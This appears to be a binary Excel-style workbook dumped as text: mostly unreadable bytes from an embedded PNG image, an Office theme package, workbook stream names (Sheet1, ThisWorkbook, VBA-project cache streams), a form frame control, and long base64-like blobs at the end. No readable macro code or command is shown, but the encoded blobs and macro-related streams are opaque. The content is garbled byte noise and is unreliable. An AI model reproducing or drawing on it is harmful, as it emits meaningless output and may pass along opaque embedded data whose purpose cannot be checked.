ªŽþ^Ìˆ5ü—¦T×x”~Ð»Õ.¶oÕnÙ¬®ø¾€‘–gœ«˜Êâ÷i‚ó™ØÔÐbÇôbp‰µ3ƒ~-"Wqeöu½Ýzš>Â¼èÍS.!ï‘-ä\­ &8JÑ0§ê*›÷ü¡T±{{bìÁ}^8R²$Ïõ ì©+ßE÷Bv	ÌîÅÃ9
K_öULÊg;±óG´ÔQÅ•qûCzR\^¢c0%K‰'DeYøå‰ã[-¡œˆSÆŠÉ1OJn-TÑ )¹„˜ÈYÔÙU;&Š­C‰%3€zS‡âJè…P§Zwa’M"L§(ƒP î· }Döióà‰
€âJÔ†¶GË¿RX¹	¤€£½ÝÐÕªœ>žUÙ8IîÊ‘¼ÿitVéí¦+oN âGa‚LbtCêOa½R<?¸‘¦*S©N}*¹HUi_1;,·<zÎƒÚßòœøñÓI$#_¦ÂÅ/ù®óña@ZûåQ²ºò<äJ—Àtâ¼²–-`AÁ#3ù|r¢ö+hÜ'W<}2¶G˜ÔÐ¸o€ ²èdÿ.«»É«bËpãFÐß¡/ÍA H½-¥’vþç÷)…ø»Âéœ «&•jm_ŒÛír•B£‚¨75QîGl1Ò¶#:7­zÊá»¥kö(ÞøÞ
(ˆ@ßK´™\nuõTuÞKÆ	ƒò¦¸‰0ÔµLÃà$›:ÄJR¬
Î±ºÉeqßÌi_?þ	²K,½†é@7áû©ï ¤€M|÷¾rmÚç
óWÁ½éªùßQ<s¥3B@–Õ¾ÊY"ü3"z4Ñ`@ê×‘nRžèäF¡ì$Ïœ*rPk™žˆ7"Ç§S¥ÑçG¢Õ(1.TÚ‘È.)¡Ø‰Õ¤bÜßY(éPÚ~ý¦ŠIÉüZŽÒê’r9*3âÞßÚ9úÊòP	‚áøX%¦Z„($J‹ºóz¨„Î–s…ÎäNùrIœ„1ºnÇˆJµb{tU=Äm!'çBnÓŒæÆ÷sÌ1QÀ<$¢D7¬üÆ…^®
ÜY3fV8“[*äÛöy¹X]Vs¯"bëv`Ü&a®³ìñÙËcâ0±¤loÆM°sÃä&¿9ÅXlI6u ðÀôa~ÛWV	’#·TÊ=C‰ïYS7»¦¤<²
ÌíKïÇ]bÔª ”ˆ-íÍKœeKÈík^®qÏ(Ÿp¨ãŒØ…S^ãuµáAÚ)Z•Œ=æÁh¼M,` ÁuèÁÍ]<B>i@øã7­N$v&Hƒ@u×©ôz– >ZE¡që×H5®x«1ÑTÁ}_AŸüýµ2K
¹9èTÝÜ
î»’-y/‚vÁÚƒVKá®ý÷­ç“w¤¸}YËjÖN›‡;iÓ˜•ã„äêëm-‰H
yœ§¶ÚÅ9ÈªCŠÍ‹¤­„ÔÊMTšÆBd‰^ü„ÜBN$TW	õ0”p.¢¢ª¨.o¥†Š©Sœ.Ü¯4òPJ<–:š"Úµøžºû–pïhÛ‘­îS.J,©6[ˆMtEÁL•dS ë÷ü&OlÝ;þØ>–Q¹5nÉ—Â›<ú'ñ¦
bÃ£èè…1é*,zNé10I‚¾rîW•5dKpýÝé®),,ARÓŸÊ¾iª0PÂÑÊš~Ÿ/I Õ¨mÐÈf,1±Ék¦»*1l
C¸°’øyaœcøÒ1ç÷¨^,¡óþ§¼OÙâš€Aiº«k6Ù¯tì-P¥ §s-5ºuZLÛú6Hp8=$/vumšŒu6°SÜPð¼I¶I &VJ8«A›¾õ<ˆó¸•ykwÇaw›J††ÉÄ¤Ú˜á¥³åéw[´¬–4Þ±u+Ÿë”½ÐXN[(õ×$Kæ#Wy^6uˆå*tŠ´ìï'"‹éÙÑU¿¹e¼v½:ê’HÇ²©Wl-t …$¶‹˜¯55¦ííÉ¿.¿Û$$9-åÊýaß&!õ¶ãÒ bI@¸î@Yx	X’@ ˆ%	X’@ ˆ%	X’@ ˆ%	X’@ ˆ%	X’@ Ä’@,I Ä’@,I Ä’@,I Ä’@,I Ä’@ –$„LÉN³7|aã²ZåÝ±WòÒ®ì.X²|Í}7¼ø¿Ûm Ú¿
`00£™LÌhä{É®•i5‚,b¡ 
 Y8LMMH8ÒÝC‘³›ó’cÉò•%o¾qr¶ã›
îL‹ïf¦}&a„ÁdaÖBf-bÛ8ƒ9tíIøBÈÏ7Åõõ2¿—s%«,YRÚÔsa3¾ï~çnÕÝõÁ’ff½¼¸jª£´Ølçò¤ñZ˜ê¡P×`ïáÞ‹xÚXÐG,IÈ‡,ÉåÁ;ÿjÿOþv[||Byç:õò£oa·>±qR(öQ‘W2Î™T"ŠP¾2GåÊFxS»¿ûþÆ:ø*$JæBëü©üÈîï7Ö‘z…amSõHU}SÉ„±öÑFÃUÙaÒGÏ÷õ|Ò}æÙ¶£¬»ùú¨©	9Ë’ì@ßO:ÿvõÃÃïþãOÂGö”¬G¿ýÔ†{ÞôÅ’Ã¿í†÷cf]úÉ†Ÿ¸ã5î™R™c½ãÑŸlQ,žKîu~¦ã¾ùÅïþã†“&6ïÏ6²Ð§ÔDWX–4ÖÚ
«ŠË&WVWv™ŒW™]É1
…C!ñ1úƒAûeÇù`]—ã„ÙÌ|ÔÒ„<°$à<Ûò½
\Öûîweü—1ßÎÅ(µ]<ÐÜÉÅÕ„¸øÖ'‡ù	'=µlÁ%Ðƒ]_ïÙùÃ“Š:¿g×S
î¤&ºÂÊ†Ál6;

Ng©³Äl¡––°ÆýãÇphQyxïóùú  

,
÷JHY!ä%t¿³yÝ³“˜Ì’@Ë‚¯þäû»Ø8¶úî/R½^SÒ¤Ñd2Y­V›­Àl2Å%Â	\Ì†´ù
KPkÖŠÌôûAƒð:åQ$!ÒV nXöÅìãXué…KqßrßÎEÅý]¿¦8 ?h·ûgÅ‹¾sŸùÙ¼…ODŽ‚Âþ°ruíÂÕ
à,¿ß?88èb```P|N/L‡Ó_ ôõúûù¿? Eø|Ê_PœÜ²Éd&–$äU–<yñµoþõFå­ëÔïåžwß©»fÝ÷×+¸Oæƒ¿œýµß\äè9¾¥Ç0NýãÒ™É/s ïÝ)åË¾»q÷Þ<ÅêHã¾X)…G£dú„ Ã­?•aÀ ""”ü5èÑ¦‚f28iðû-F£Õb1˜L¨tÃùÁpÈ6X  ¯:K+aø‘¾{Ø!Gh®ŠJš&Ô?2cñ­µ5%åy×¸À€ J>i›Í@—`4›ß*!eQ¡`0ÐÛ;èñø¼^37¦:Œ6[0à¢(HŽ
H‘ð7œöt¾sòÀs‡w|zî3ÖÛMMMÈY–~Ì¹±©çƒÍÔDW|"˜ü¸kØ˜xí
Zý„°–R„D=N6™€Á,&EÐ‹˜ù¹ŽÓ÷Œx— Q†£$¿sÐ¯£—0*biä¡p”n“™4nÂÕÆ’ãØê¯mŒX6þú'ïS
„B¡@ d;øl(Sž`IÎ;ÜägJÂ•¨eƒ‰„çÃ_a|TnT|Gi3º~ ú9gI¸gÅoÃ¢?7Äkèx‘0±$ájcI%Øˆšeä±$ðZÿ€7Â{´
.C¯± <Db âvö£[†‹xF£U’ò2B8
þ>Àoý3!åfåžÊ™ßR8o^‰¢†%\í7ad   gÉþþèNAOÄiÃ_Tl‘"-Qèr.kŒà94;ú)ÌÈ0î DTEL5(7äë)9#rfÂŒJÁ\Ô5’I –$äJ`6'Jÿ Í¢ú+((@{"
’(KÂûÁÁA!oê*ËHŽ(fÊiŽâ$ 6…¼~?P5¿üóùÚ7á—ˆŠÀf£9LÂ$X’_âCÍ‰Ò¬ð‘pÅÈgb·–û§™¢¡9YS¤ì/‚"øËl6Øí…È™"N‚¨i2›(W*w¥"hX’ ~4[Ì6›-dâ‘:È’@‘V«UÉˆ”gŒRRrjKß-žèÆp¹9Tx¸¤ÍfAß‘ÉVœ9Llñ–ÐS¤,»!Š$KòÕECžÕbu¢JªpÔ˜2_Ù
;r¨Y‰aÌš(Ñ¾‰î H\ºÅ‚‹Í¡hƒ²Ç XBÊ™hàŒi E7bIBþ€nh»Íf2šT:uÖ†¢"^.š¯AB @9Læó	¿"7Z†´aL±$!?·†hÎ×ÚÕJÄ\ÊAÇ:Ðð8H”²&.‚~XÔ±ŽÒ+?Q³ˆ%	yÚþxx8Îéq›h\7l}#Èzâ6à&…Ï]ˆ™ð•IZ	ø‘ 9¸	Ä’„<!õð´=f£Iv¼¨Ä:¡M#%
Q¢‘É®+/ã,Íd"u›@,IÈ7K†B>¿ßëè³ô›XœóZECHX Pe.‰¿;D) oŠÐ¢ˆR
c¢%K†¡PÐëõBa±î‰Ý&È>øæï‰¬‡‰
qÙyÃ3bI\ž$Vœü6bIÂPBIõ(dIÍÜ#–Ù¨í€’²e:±$1óktß'G:‹jÁ€²T'‘‡@,IÈá0¦¡÷Æ`érU”$/kaÒÂAtC£˜™‘c'¶æZ¬®I°¹
ËÜeä`sŸ‡–*ˆ%	¹°d¿ßßïí¿|¹wtÈœ$¿$‹Ñ!.ÒXòB–”é29àÌ"e†J¡–óe $›K†‚ƒÑ}ˆ%	Ä’„õ ý^oooï¥ Iì ¼"*(™(¨në
•˜4(:ƒ3‡X9ŽY)±¼jÍ¸˜G¤òM3
p@Y×wL,I –$ähÜ r_0öQ ¬² ('[KYŽXN#ö>ÔMTïqõaú,‰;t|<½9±$X’€xŒ¦È¾¬æh4"–6A$nâ* -²øýD\wJ–dŠ£|`` Ë. ñÛ ´èNÀ Î”©Øð¸/äÙ(É{C –$äam*Â‹á²úÑÕÇÅê¤6áÏI¦ë yì‘ÏçëgTò£ M„½RÄ*‰ûÄ¯p…â¥^O¿×ëá‹‰(	Ä’„ ìÀÓ’CÁ¢z×yoœ`6ã–H ‚ÈT¼†ùÍ€ø0 RÐ™öŠø[yQ¶ê[¡€«’TŠÐ0*%X~7 ¼Þßà P7Ù%	Ä’„<hÜ|¯V³%dˆˆè-‰&‰UÒZ³ øˆ¦C»’"7¥,ŒBüP`EâáLGyËDSÞŸGüP”fa
ß¦Ûè7Ð~ÜbIB.0œf³Ýf5jtq¡„Jô2c
^”øp ‹£ÊR.ëÂrpe’x ‘XW,à‘3ž¡ˆñ)Eßè@{4Ê›ÙŠ¤xÄ\6—¥‹›äˆ%	Ùƒ
’&»Í>zô(ç¨#îÊm4b$#|ïóùp£Á}"nQ–+Ñd™þAè#/Ä_‰¼>Hˆb+dO<Žž8ÈIÒë`Àï	û
/rC*‰“bIB.]Da™ÂBÇ¨Q£¡0JŽÀG ;
]øU]Á_*_

ze£®”WÄp"ÜŠ–Emš‰„(V‹ãö;@ˆp8‚Üì	_a|¥`IøJ°¤i`Àfã”
ÜÉhw ±$!7Û`â¢Ñb2‡
!ÜiV¦X*‘’d¡R˜åu2é‰°3"êËBãF¿6Æ]
í^ÅËò
ÈIÑYÜŠFJ~A –$ä[óVhÂÂe,¯Adñ>Ûˆ>eø‹®ÔÓ'EÉh Å2)¬ à	ònŽâÒ(„¦¼@,IÈÂ‰aŠBìVŠ‚EÓ‰‹´@éìå /p”S‘ËßŠKÈ±,G‰"¤ŠÅÛ%X’#øîƒápäO¼‰ß"1É”$;¸ÓOž&˜N«Ä¸±G&bq?òqÕZryÝŽ–7	bIB®‚¤öð® ÷F0‘I“òõ¦¹i¢*êÎ"Ó8^ˆI^oáãV‰½èÿ‘5ñx–¤V%Kò£DmÚÐ•tÉ¢~9DQþaF%²*.|ŒÈ¶’÷†E×†Ë¥àbÁ›‚šã7£†%KòD‘*ÝYNy+kÓ%Ÿ9
}˜Õ"ëídA”%P‘ÒB/—WæˆãBÞÄø$y	£È²Î”,¼l7z$K®}FC¼D)dC±63<"9Š8Ù^Î CYdRº Èæ·Ñ}UAìøC•‚¯²–Ês @,IÈ3„r|$äG©åÌÎ­¾, ""E Yßj>…Fˆ%	WDº4È»)ˆóÈG‚"E0|c0eo¸ø•vŽ>qF{(ˆ%	W.K²Lœ3ÉÕm¦#É¢”r®_¸¢Ÿ§Ó$!c"eƒV.V:RèX’0LZ¶.©©¼:ùâ_Y¢DÔ
*’7{0ÆoÎ#ßÉ’bIÂÐñcH»á—Pxå¥5ù¢c9€<Ñuñ¸#Ç•ãr9bý¸ˆx—‹b´ö†@,IÈ!Õ²i­tXïx~.ª—&™QkˆLrâ'"]ŠI'¤Ê¬GÈƒÒ=B.äíWÄbIBžºH4T?4Aæªãy®•3‰…1ÉÚGÝ¯ð ™)	¤qòH[FÝ´’rzGŒ¿É—Ø(VÚˆã"?Ø@"FåÑ…:ªítÄOŒQD¾Pr	S³ˆ%	ù%JƒJ²J$©|yoäÍ0ÜG.YÞû[>¨=YN›†ü¨úŠÑÚ±$a8TòxA/¿¼Ì¤à
‹Ëaª]ÕÉZÎ¥H B–=œª€‘"¬}ŸwŽÖOä6’Üƒê î9	D Y’ŠÔ&â
rÞ¹RN¶¦Ê¬Í¿«Íõ«Š’B
J –$ä—"C,Á"?‘œ<ïú¬®]›à2ÑÉÚÓtóÄ’„¼V,a„ Dùc.yÒÒ‘^µ„(”}GéDMRæ4±$a(ˆÒ XÒH y/Y	¤ºœˆŠ
÷‘"ŠT_	D –$?jÃÈ‡4£®f­½\I6‘º÷ÄbI!…Ë†ÒÒ—Ü…­r"%º%2Dˆ%	W†"‡ß{£{0µ’º™+	bIBž™Q•PG$¢ÌiªÝDm‰"X|Æ üÆ*ˆ%	Ý–Å[$™´&koòT‰u‘ã´Ùvq3E±”[¾
‘`MûI”bIÂˆlØ³ðŠ’åeãÚ¨r]1ÑWPQ$X’0$D©]x£ÕÁó{­”k~’dN™$˜V(R‚ÖqÒ¤­P]õªÛx‹v
#Kò±ö†éeÃ½²év’\=ÉqZ{C ›2
ëåP¬½9+å’…KGu9Ìœf” ËŒ‰ÖÞPƒˆ%	yÖ3Êa’LŠÊ£+òìŠµ‰â6€‘(u£%2Mj
”n’@,IBÒÔý8DQåºëY&[â-rÙ%	ÙSäÕK@D—’%	W Wjwµzxn@,I $#¯«e·|1&X’0|ãn€Ã4•KG%KêBæ=è@,I $“ït3‡³áòÞÄ¢yÒóÞ$*‡@Hä½!äM–†ketpØî“@²$ ÖjuI'_Ù.dë¡œ¥"IV
íÉLÚGµ#@,IÈ'Báp0
üþ€>`š2øë÷ûz‚
àH È—>+R ÖÞÈÛÌ
Õ[u\¬ÉÑML‰ƒÁP$`ˆ%	92V òù|ý^o×
Ã{dI E ž€³Ù¤	µº­ÊŽ™“ŠM´ád‹Åå#câq¸S¬“2Â9bQ#ž,ØVìÇ-_=BD‘bIBî’¤7ðx/y.]šŒaÎ@.fH— Ü¿Pâä|½â#²Xšª=œlµZ ¼®ä
ïµkoÄm8ˆŒ‰÷‰LŠl+ÿ$È¿WˆÊWˆ%	9 /èëëïéé¶†
Qª|'"%åUÞ‚žð4Tmá#’i:,	"‹ŠŠ€Ý´"*
*ó%¾ Q­(êâ½a>&ùÇƒœFù]ùHœ$Kr&{ƒAŸo°¯¿¯7d62ƒœxBf.™³P”CZD–i{a%gI8§   ø±°°ù.ý;FkÀàà ^ „+îÏQäÍ`D–$ˆ%	¹ÀÂIK^  YL:–G-Ç¡±-’h²„²²œŽ,	¼†ê¼ìuIÈÈBÝf’‡'ÂýQÃ$µ/X’+ü£B:®ù¦Á*BfD‘-Œº›s%)YR #ï9^Z¬˜D[$Áç¨2QÄ’„ì!rßZÌ©;Œ*¬‰RdÉªMGãfQ‡œÙœAGE!QxÉáB!1»$
Ã.oÒj±$!7mQvãúr8™ô'8Îjµ¢£-’ÈMXH:â–†nt•˜G‹Mº< 
çŠr¢ŸVbI±$!×.‚b AëÆäÉ¢QŠ,ºÐEDz£`ˆD©ÚÑ[U”ˆ”ÄàGÙ{“œ.3úý~9RR"8Ú¯ØJÉÇM –$ä Ë™¸Lg6M†¤J®	BÁM•+HØ+Q,•óúÈY×ÄÉ(K†”˜ö4-#Úttaà\Œ
’—'B<b’¼7bIBäÒY0Â!³Ñ¤ßQ °†<ˆÊ²ödT¥ív;håLãz–YË7À’H¾²šŒÖ¹NN"¢^Îo˜ˆ’@,IÈÆ5nx‰ÅZÒA­¸µZèTÄ ol6’6òiòÚAÁ¶"(Å»ªSß°Æ ¦~î½1F¼7F2Mˆ%	¹iÜJ,²ÎO Uº62.’^éDËlDTÊzÂŽA‘²ËEHŽHÍB‘Ï"§¥•$K†–%î3ën·-¨P¼IB‘BFî~äMaÜì)B‚#ç=9ù¸	Ä’„\dÑòhÔ3ð¡o%JÔ‹Ñ9£K”˜:Ãƒ(‘1"2ÄS´„äú;¨àÍ|=Tÿà ’²²]ˆ%	¹³$	zo‚Q•îAÀ¨;ëê¹¸p=×LYO)…D–\LŒ†©}†NYÆÄ’ä½!KòƒpH1†B&YP8©Ep¼ØFëE¡æB¿æH
	ù2†b_ÆˆHË…c?ðþ ±$X’;ŒF·LêÅKŠ´’"†£pt˜¨‹hJ±ŽL¡Sã9ðäJáÊïšk\¡h`†²Kˆ%	yA$\\³XP^`#dC– á®Èöˆ±2±bˆf’×2êæªÈƒtÌ“wðbi7X’+0H	˜4jYR€B”Cµ,)dIÐÐÅzcª`I™Uó«zc&È:nŠ—$KrdIäü§%>´HÊ»8$	lYÍQ1ë™’Ÿ\¶Eâá=ÏãC¡3ŠV(ˆ%	y@0º«LgZîSQ§Ž’¿G˜œM0£¼[N¢Â³6Ä±dÀo4)Úœ@,IÈK†¢û²‚Žœ`MtX^4ˆL1©šˆ©Tíô€7º¶…4*ï!œ?xC…ä}ÁDp¥6õ†J¶5(Á˜Ü6JDI –$äˆ€’íyÒ eúÄ'ö]fÄDûÛ¨´rŸÏ‡î‘G’I›hc!bëáê{7Š¥82Šètü
ÅóÈ0(Ç„ÜIML –$-Dª
±·uM¤˜
G
¼÷z½6›
Í”èÌQå=cÒ6Ü€‚‚áLGvªÅÔA¸VGpñàà ‹Fqb²8©Pyd…:µ X’
B6±-b(ÈôL(ÂËˆò g4 &Ó¥ @¾Ü1FôûìŽBNUf“Õb
…C&f2‡Íâ·‘  #wCLFK•e£"â¢I“ÅÌ¢–Í`8ddá‚«?0‡-HÌþ` Ì"
{bYx•ßÒŠbIBî$î
ú<>o§÷’1Ì´¨g'– Í4ýúá(f^f¾~S¨Ë×/‚‡Lþ~Ý¼åñ|‡Eª
ù+Ü0
_|4~3„Š8ˆ7a†¡Ëûüþ6Ûí½tÖ?Hë¸	Ä’„œh’ù¼‡/»A.µ8€üÂî3$ÇtÏíØvÙ6êRèÎª0 äJ=ÓxÉešÖåVÕAƒtó Hžïí:ØÙÖ;ÐËB~jf±$![l°wwøüîþn§Élsc^ö……Ã6“Ñj2;¬Ö‹Ùb¸b½úÃ¡6ß@{ÿ%ÖïáÏH K²D8Èü^ð6ëaùptp¥×¥±üºM°´ŒŒŒá
øY(ÀŸ‘@ –$dË’aQ+ÀˆI×+ŒT@,I Ä’@,I Ä’@,I Ä’@,I Ä’@,I ]ü_ M1§îé±AF    IEND®B`‚3 
ð   ¿   A  À@  @ ñ   
      ÷  ü          ÿ   c c                  –A–          «€ PK     ! éÞ¿ÿ        [Content_Types].xml¬‘ËNÃ0E÷Hüƒå-Jœ²@%é‚ÇŽÇ¢|ÀÈ™$ÉØ²§Uû÷LÒTB¨ l,Ù3÷ž;ãr½ µÃ˜œ§J¯òB+$ëG]¥ß7OÙ­V‰<a¥˜ôº¾¼(7‡€I‰šR¥{æpgL²=Žr¤Òú8Ë5v&€ý€ÍuQÜë‰‘8ãÉC×å¶°X=îåù˜$â´º?6N¬JCƒ³À’Ôì¨ùFÉB.Ê¹'õ.¤+‰¡ÍYÂTù°è^e5Ñ5¨Þ ò
ŒÃ°‰_Ïg -æ¿;ž‰ìÛÖYl¼ÝŽ²Ž|6^ÌNÁÿ`õ?èÓÌ[  ÿÿ PK     ! ¥Ö§çÀ   6  
   _rels/.rels„ÏjÃ0‡ï…½ƒÑ}QÒÃ%v/¥C/£} á(h"ÛëÛOÇ
»„¤ï÷©=þ®‹ùá”ç šªÃâC?Ëháv=¿‚É…¤§%[xp†£{Ûµ_¼PÑ£<Í1¥H¶0•ˆÙO¼R®BdÑÉÒJEÛ4b$§‘q_×˜žà6LÓõR×7`®¨Éÿ³Ã0ÌžOÁ¯,åEn7”Liäb¡¨/ãS½¨eªÔÐµ¸ùÖý  ÿÿ PK     ! ky–ƒ   Š      theme/theme/themeManager.xmlÌM
Ã @á}¡wÙ7c»(Eb²Ë®»ö CœAÇ ÒŸÛ×åãƒ7ÎßÕ›K
Y,œ 
ŠeÍ.ˆ·ð|,§¨ÚHÅ,láÇæéxÉ´ßIÈsQ}#Õ…­µÝ Öµ+Õ!ï,Ý^¹$j=‹GWèÓ÷)âEë+&
8ý  ÿÿ PK     ! u>™i¹  Œ     theme/theme/theme1.xmlìY[‹ÛF~/ô?½;¾I²½Ä|Í¶ÙMBì¤äqÖ[“iŒf¼%yêK¡–¾úÖ‡Rh ¡/ý1
	mú#zf$Ë3ö8{a)iéiô3ßœsô‘týÆãˆ:Ç8á„ÅM·|­ä:8±1‰§M÷þ°_¨»(#ÊbÜt˜»7v?þè:Ú!Ž°ö1ßAM7b¶S,ò#~Íp×&,‰€ÓdZ'èüF´X)•‚b„Hì:1ŠÀíÉ„Œ°3”.ÝÝ¥ó…ÓXp90¢É@ºÆ†…ÂŽÊÁ¼CçÑ¦
óŒÙÉ?®Cp¡é–ÔŸ[Ü½^D;™[l5»¾úËì2ƒñQEÍ™LóI=Ï÷‚Vî_¨ØÄõj½ äþ F°Ò”‹îÓo7Ú]?Ãj ôÐâ»[ëVË^ó_ÝàÜòåÏÀ+PêßÛÀ÷ûˆ¢W ïoà=¯Véx^R|°¯•Z]¯fà(¤$>Ú@—ü ÚY®6‡LÝ³Â¾×¯U2ç+TC^]rŠ	‹Å¶Z‹Ð#–ô 	;b1Ã4‚*î Jâì“i…7C1ã0\ª”ú¥*ü—?O©ˆ Œ4kÉ
˜ð!ÉÇá£„ÌDÓý¼ºäÍë×§Ï^>ûõôùóÓg?gs+W†ÝŠ§ºÝ»¾úë»Ï?ùþÝ‹¯Ó©×ñ\Ç¿ýé‹·¿ýþ>÷°âU(Þ|óòí«—o¾ýò_X¼·t¨Ã‡$ÂÜ¹Oœ{,‚ZøãÃäbÃÃ…àÛâº'Bx{¨
×Æf$ 26àÍù#ƒë Læ‚Xf¾Fð€1Úf‰5 ·ä\Z„‡óxjŸ<™ë¸{Ûæî ØHpo>y%6—4ïR
4Å1Ž¼ÆŽ0¶¬î!!F\È(aœM„ó8mD¬!’C£VF{$‚¼,l!ÕFl8mFm«îâc	·¢òCL0ÞDs"›Ë!Š¨ð}$BÉÁ"é¸é)¦Ìé1ç6›;	¬WKú-P{Úè"2‘‰ G6Ÿûˆ1ÙeGE3v@âPÇ~Â D‘s—	ü€™wˆ<‡< xkºl¤ûl!¸âªSZˆ¼2O,¹¼‰™Q¿ƒ ¬T´ßôˆÄgêûš²ûÿŒ²[Öu5šnwldå‚jÞJˆõžÚ[Óðm¸¡rwÑ<¾‹áfÙì\ÿ
÷ÿÂíþç…{Û½|õr½Rho¹gM÷êjçmÝ¸O¥± xŸ«½;‡¾4îÃ ´S­8›…p(ïd˜ÀÀM¤lœ„‰Ïˆ !šÁ¿ìJ'Sž¹žrgÆ8ìûÕ°Õ·ÄÓytÀÆéój¹,ŸMSñàH¬ÆK~>Ï"E µÕ3Xî^±ªgå%i{Úd&‰ª…Dm9(ƒ¤žÌ!hjeWÂ¢aaQ—î—©Ú`Ôò¬ÀÆÉíVÓõ=0#x¤BežÒT/³«’y•™ÞL£`±¬€U¦’ëÖåÉÕ¥¥vŽL$´r3I¨È¨ÆC4ÆYuÊÑóÐ¸h®«”ôd(Ô|PZ+µúûX\6×`·®
4Ö•‚ÆÎIÓ
ª>”ÌÍšîžûá0šAíp¹áEt
/ÏF"IoøË(Ë,á¢‹x˜\‰Nª8q(‰š®\~ž+
QÜÊ„–\dåC# I7“Œ'<zÚµéô>Õ
ëUe~y°´dsH÷ Ÿ8‡tžÜCPb~­,8&^ÿ”ÓhŽ	¼ÏÌ…lUk)“]ý…¢ª¡tÑYˆ²Ž¢‹y
WRžÓQgy´³lÍP-$Y#<œÊ« Õè¦y×H9líºgÉÈi¢¹ê™†ªÈ®iW1c†eX‹ååš¼ÆjbÐ4½Ã§Ò½.¹¥Ö­íò.ÏãgéºçhµÕd5ÉxS†¥fg£fïX.ðjçišê K·kqË{„u:¼Tç »õª…¡Ér_©"­>|èß&Øá#.¼žSÁU*áËC‚`C4P{’T6ày,²[ŽœyBšî“’ßò:¿S(Õý^Á«z¥BÝoU
-ß¯–{~¹ÔmWžBcaTöÓ.}xEÙ§5¾ñù%Z¾k»6bQ‘©Ï+EE\}~)W¶~qˆÎ“ ÒoTí Ð¨¶ú¯Û® ]èZ·ßíøõFÿ©ë+°×ªv¼ W/åN§à%I¿Þ(Ô¼J¥åÕZõž×zšmc`å©|d±€ð*^»  ÿÿ PK     ! 
ÑŸ¶     '   theme/theme/_rels/themeManager.xml.rels„M
Â0„÷‚wooÓº‘&ÝˆÐ­Ô„ä5
6?$Qìí
®,.‡a¾™i»—Éc2Þ1hª:é•qšÁm¸ìŽ@RN‰Ù;d°`‚Žo7íg‘K(M&$R(.1˜r'J“œÐŠTù€®8£Vä"£¦AÈ»ÐH÷u} ñ›|Å$½b{Õ –Pšÿ³ý8‰g/]þQAsÙ…(¢ÆÌà#›ªLÊ[ººÄß   ÿÿ PK-      ! éÞ¿ÿ                      [Content_Types].xmlPK-      ! ¥Ö§çÀ   6  
             0  _rels/.relsPK-      ! ky–ƒ   Š                  theme/theme/themeManager.xmlPK-      ! u>™i¹  Œ               Ö  theme/theme/theme1.xmlPK-      ! 
ÑŸ¶     '             Ã	  theme/theme/_rels/themeManager.xml.relsPK      ]  ¾
    › ›             Œ Œ              — —          oQÐj¸Áâ´¡ù® >
   	   T8Í É    
             ~¦  
     d          ü©ñÒMbP?_   *    +    ‚   €          %   ,  Á      ƒ    „    &  ffffffæ?'  ffffffæ?(        è?)        è?M .  O n e N o t e                                                   Ü P/   	 š
4d   ,  ,  A 4                                                                                           ÿÿÿÿGIS4            DINU" Ø 4 ¤ÖÈ                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Ø   SMTJ     È { 1 3 3 6 1 9 e 4 - 1 4 3 b - 4 6 3 a - b 8 0 9 - b 1 f 5 1 d 0 5 f 9 7 3 }   InputBin FORMSOURCE RESDLL UniresDLL PaperSize LETTER Orientation PORTRAIT ColorMode Color Resolution Res300                 V4DM                   ¡ " 	 d     ,,333333Ó?333333Ó? œ& œ                          <3        U                   ì Ä  ðB   ð         ð*   ð(    	ð                    
ð          ðl   ’
ð     
  s 
ð2   …    ¿  
 A   
   À@  ÿ   €Ã   c p p     ð      P          M   ð    ] T                         	 *           
  Forms.Frame.1cR            ì †  ð~   ²
ð      
  ƒ 
ðD    € ûA   ?   ¿   ÿ  ?  €Ã   ¿   P i c t u r e   1     ð            p 3   ð    ] &     `               ÿÿ       > °    @           ‹ ‹               *      * *   º	   Sheet1g g           ÿÿÿÿD  
                                                                                                                                                                                                                                                                                                                T h i s W o r k b o o k                                          ÿÿÿÿ   ÿÿÿÿ                                    c   ¸<      _ _ S R P _ 2                                                     ÿÿÿÿÿÿÿÿÿÿÿÿ                                       Ž      _ _ S R P _ 3                                                    
      ÿÿÿÿ                                              S h e e t 1                                                       
      ÿÿÿÿ                                    /   ‹
      UPaRXJRZ5h2Jl0arUsePVVOXyiqj3HQm7ZTsVDsNYFd/2DZd3VRVXAdtDxVLV2vWpxTP/bivubfF99daqSEXDBtD14iK4bm/sV63gbouqcvVt63bG/mktsl9dgD9SKVKLCj+0upfS6ddfKQuVvPKU1etqFq/Pl5frpfXP9eXe4vVlyx+jXtK/vPy7ugopVEwI3mFMVGNQrVx347pTyyqvMz5oO8u9EUBIrvJBpJ6XFtDO9+Rsl8syufU8DgEKPVWcTSaA5wLXOKEgZrNOAoEeTKukXnbFJA7fInGCWC1/kxJQ4NY/J29ru9YArCN8K36HEWnYQuo3W3EVO70gjyu1/wmuzgLch3eGIVH4fY8jHTSZl7ZHbRAShiBoCBbJ11YuI27Q7NXjRlpD4TvJxRETS1WZzVqeYbpyN0kt2nXprSjSOThloFg28vMaAqwNv8N2kFu9nKU1RfzALT5R3exVg8JJKDI184IXdejk9rJs1t6OKGK/iz0qEtvBVMfCxnhqleV8Q0VHxLVHt121rGUMJBAYJOhJeYHwLt44vMH87V9HDIEwVY0Js0XthEZw6US0iGSSSYnCNwCtIm3DDWriPDTH2IwZiOzGyI1wQqsPlRCkLStvRWYxvv9' 2  i ÿÿ(   –       D  @% B ' >      i ÿÿ    –    ¹ ÑuvBkLovwm4lLg2EExucNQrEsdyffnkWrLac2RjeeovQj1pgMu5c0IoYbDIMZTEYiTbJwg7R4QvkmQ5oSKt1fr6QivV00Foz1Yl7mVHwhurxTGZjupN3bb1QDfXqGJBFIgrAT1xSpYYGZ/u4fhbSfmCukluEWbK8/RHbyjC2sTDgHZ0YIumbJJW3k6XVsHERJ0IscvyBAUBA3mSRDHe8+6FlAzb9k9bXkyAxHKiwWUq4F2iNzcCiTQGXIUolzkCJD3BMdongg5FV0TsRI2MTIS6vLJCGDEr4toSdPVBDZ1o2TyHbrws70lAtBNo/akSWO1mWZs0oLhVg8BhGPU8BvqUWxfQXopzU97O2WxwIYW0QweN9vJWqmrfD0he/+Id+y0XmjfHYp7/E9Pbla5z5lxKRjQNW+x3jfs61vXEXW3YNpxNLx2nGTNIxcejOKOb7ysiPNroiDiWW9PRfv2zNQIhyAHhskeGzPS9kLriovMLqZOpGFg7E1nUiz4bU1mWlHVN1879H7wVdtlTk/NdArVzsxOCJEQsuFLhrPa8XqSvpMpCFAantQjPsEgWq14ZZMw7bMZGUcksDPboP4wewDMQ/V1E7u2/rZ9D8yuKnyg4U2bJLAohjU/JihUXUKTIc2001Ny+VFMRSr2D3kz1nMwNsGLsjT9EITMhFO5UjJOhoxAu1ndNzEZdydRgtItY9PZ8zhjClD